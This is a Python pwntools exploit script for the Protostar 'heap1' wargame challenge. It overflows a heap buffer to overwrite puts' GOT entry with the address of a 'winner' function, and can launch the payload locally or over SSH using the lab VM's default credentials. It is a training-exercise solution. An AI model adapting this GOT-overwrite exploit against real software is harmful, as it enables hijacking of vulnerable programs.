#!/usr/bin/env python

from pwn import *

#  offset differs, and is 80 at local and 72 at remote
winner = 0x8048494      # (gdb) p winner
putsGOTEntry = 0x8049774    # disas puts call

def printIt():
    payload = "A"*20
    payload += p32(putsGOTEntry)
    payload += " " + p32(winner)
    print(payload)
def local():
    e = ELF('./heap1')
    payload = "A"*20
    payload += p32(putsGOTEntry)
    r = process([e.path,payload,p32(winner)])
    print(r.recv())
    r.close()

def exploit(ipAddr):
    payload = "A"*20
    payload += p32(putsGOTEntry)
    payload += " " + p32(winner)
    s = ssh("user", ipAddr, 22, password="user")
    r = s.run('/opt/protostar/bin/heap1 {}'.format(payload))
    print(r.recv())
    r.close()
if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])

elif sys.argv[1] == "print":
    printIt()

elif sys.argv[1] == "local":
    local()

else:
    exploit(sys.argv[1])
